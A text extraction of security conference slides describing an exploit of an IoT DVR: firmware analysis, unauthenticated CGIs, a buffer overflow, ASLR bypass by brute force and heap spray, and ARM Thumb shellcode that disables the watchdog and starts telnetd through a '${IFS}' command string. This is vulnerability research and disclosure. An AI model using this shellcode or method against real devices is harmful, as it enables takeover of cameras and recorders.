From Dvr to See 
Exploit of IoT Device
0K5y
Nobody@360GearTeam
1559113201 Date
Larryxi
Nobody@360GearTeam
Whatâ€™s time
0x00 Content
0x01 Preface
0x02 Vulnerability Mining
0x03 Debugging Environment
0x04 Exploiting
0x05 Summary
0x01 Preface
Welcome and Thanks
IoT Four Modules
IoT Current Situation and Problems
IoT Architecture and Exploit
IoT Attack Roads to Rome
0x02 Vulnerability Mining
Environment Preview
Get firmware in ten ways
Software
Hardware
Get information after first-look
`telnetd` commented out in `etc/init.d/S99`
Weak password found in `/etc/passwd` 
Armel architecture known by `file /bin/busybox` 
Get general method 
Web-side command injection or buffer overflow
Obtain the shell by the root weak password or not
0x02 Vulnerability Mining
Web Vulnerability
Static resources of the background pages can be seen in burp
Identity information is passed in url to get dynamic resources
Some cgis can be accessed without authentication
Some cgis can execute certain commands such as reboot
USELESS
0x02 Vulnerability Mining
Buffer Overflow
0x02 Vulnerability Mining
Buffer Overflow
0x03 Debugging Environment
Get Debug Interface
Cannot remote debug through telnet shell
UART interface only has log output
Cannot get system shell through modifying uboot init args
Face Problems
REPACKING
0x03 Debugging Environment
Get Debug Interface
Round One
0x03 Debugging Environment
Get Debug Interface
Round Two
0x03 Debugging Environment
Get Debug Interface
Fight
0x03 Debugging Environment
Cross-compilation Environment
gdbserver-7.7 + gdb-multiarch-7.12 = keng
gdbserver-7.11 + gdb-multiarch-7.12 = zhengxiang
0x04 Exploiting
Security Mechanism
No GS
No NX
ASLR is 1, address of uClibc is indeed randomized
Vectors segment address range is fixed
Watchdog exists in kernel module
0x04 Exploiting
Security Mechanism
0x04 Exploiting
Exploit Plan
Get exception before 
function returns
Haystack of strcasestr
is overwriten in 
payload
Get fixed readable 
address in vectors 
section
0x04 Exploiting
Exploit Plan
Due to truncation, cannot find one-gadget in code
Gadgets in vectors are useless neither
0x04 Exploiting
Exploit Plan
Bypass ASLR
Information leak: http response is limited, unlike the 
serial port
Violent hacking: program is restarted after crash
Heap spray: processing thread uses shared heap 
allocated by brk
0x04 Exploiting
Exploit Plan
Reverse Http Processing
0x04 Exploiting
Exploit Plan
Reverse Http Processing
0x04 Exploiting
Exploit Plan
Review Vulnerability Environment
0x04 Exploiting
Exploit Plan
Two Pops Jump to `GET /cgi-bin/xxx.cgi?p=xxx HTTP/1.1\r\n`
0x04 Exploiting
Shellcode Construction
Badchar and Nop
`\x00\x0d\x0a\x20`and `GETB`
0x04 Exploiting
Shellcode Construction
Play With Execve
#include 
int main(void) {
execve("/bin/sh", 0, 0);
return 0;
}
#include 
int main(void) {
char* argv[] = {"busybox", "rmmod", "wdt", 0};
execve("/bin/busybox", argv, 0);
return 0;
}
0x04 Exploiting
Shellcode Construction
Learn From Pwnlib
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x786f6279           \x79\x62\x6f\x78  ybox
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x7375622f           \x2f\x62\x75\x73  /bus
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6e69622f           \x2f\x62\x69\x6e  /bin
push {r7}            \x80\xb4
mov r0, sp
\x68\x46
mov r7, #0x74        \x4f\xf0\x74\x07  t
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x64770064           \x64\x00\x77\x64  d\x00wd
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6f6d6d72           \x72\x6d\x6d\x6f  rmmo
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0xff786f62           \x62\x6f\x78\xff
box\xff
lsl.w r7, r7, #8     \x4f\xea\x07\x27
lsr.w r7, r7, #8     \x4f\xea\x17\x27  box\x00
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x79737562           \x62\x75\x73\x79  busy
push {r7}            \x80\xb4
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
mov.w r1, #0x12      \x4f\xf0\x12\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0x10      \x4f\xf0\x10\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0xc       \x4f\xf0\x0c\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov r1, sp
\x69\x46
eor.w r2, r2, r2     \x82\xea\x02\x02
mov.w r7, #0xb       \x4f\xf0\x0b\x07
svc #0x41            \x41\xdf
0x04 Exploiting
Shellcode Construction
Learn From Pwnlib
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x786f6279           \x79\x62\x6f\x78  ybox
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x7375622f           \x2f\x62\x75\x73  /bus
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6e69622f           \x2f\x62\x69\x6e  /bin
push {r7}            \x80\xb4
mov r0, sp
\x68\x46
mov.w r7, #0x64      \x4f\xf0\x64\x07  d
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6f6d6d72           \x72\x6d\x6d\x6f  rmmo
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0xff786f62           \x77\x64\x74\xff
wdt\xff
lsl.w r7, r7, #8     \x4f\xea\x07\x27
lsr.w r7, r7, #8     \x4f\xea\x17\x27  wdt\x00
push {r7}            \x80\xb4
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
mov.w r1, #0x4       \x4f\xf0\x04\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0xc       \x4f\xf0\x0c\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0x1d      \x4f\xf0\x1d\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov r1, sp
\x69\x46
eor.w r2, r2, r2     \x82\xea\x02\x02
mov.w r7, #0xb       \x4f\xf0\x0b\x07
svc #0x41            \x41\xdf
0x04 Exploiting
Complete Exploit
Write Script to `sh`
#include 
#include 
#include 
#include 
#include 
void main() {
int fd = open("/tmp/XXX", O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
write(fd, "rmmod${IFS}wdt;telnetd", 22);
close(fd);
}
Video
0x05 Summary
IoT Vulnerability pushs forward security awareness
Attack thought is same but not limited
Attack takes result, defense takes process
From Dvr to See 
Exploit of IoT Device
Sina@Larryxi
Larryxi
PI:EMAIL